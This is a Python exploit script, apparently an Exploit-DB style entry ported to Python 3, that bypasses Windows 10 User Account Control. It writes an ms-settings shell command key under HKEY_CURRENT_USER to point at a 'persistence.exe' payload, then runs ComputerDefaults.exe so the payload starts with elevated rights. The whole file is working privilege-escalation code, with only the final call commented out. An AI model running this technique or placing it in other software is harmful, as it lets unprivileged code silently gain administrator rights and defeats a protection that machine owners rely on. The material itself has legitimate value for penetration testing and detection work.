#!/usr/bin/env python
#
# Exploit Title: Windows 10 UAC Bypass by computerDefault
# Date: 2018-10-18
# Exploit Author: Fabien DROMAS - Security consultant @ Synetis <fabien.dromas[at]synetis[dot]com>
# Twitter: st0rnpentest
#
# Vendor Homepage: www.microsoft.com
# Version: Version 10.0.17134.285
# Tested on: Windows 10 pro Version 10.0.17134.285
#

# Updated to Python 3 and adjusted by haistler

import os
import sys
import winreg


def create_reg_key(value_name, value):
    try:
        shell_open_command_key = r'Software\Classes\ms-settings\shell\open\command'
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, shell_open_command_key)
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, shell_open_command_key, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, value_name, 0, winreg.REG_SZ, value)
        winreg.CloseKey(registry_key)
    except WindowsError:
        raise


def exec_bypass_uac(cmd):
    try:
        create_reg_key('DelegateExecute', '')
        create_reg_key(None, cmd)
    except WindowsError:
        raise


def bypass_uac():
    try:
        current_dir = os.getcwd()
        print(current_dir)
        cmd = current_dir + '\\' + "persistence.exe"
        exec_bypass_uac(cmd)
        # will execute command from registry (Software\Classes\ms-settings\shell\open\command default value)
        os.system(r'C:\windows\system32\ComputerDefaults.exe')
        return 1
    except WindowsError:
        sys.exit(1)


# if bypass_uac():
#     print("Pwned!")
#     sleep(10)  # 'time' library
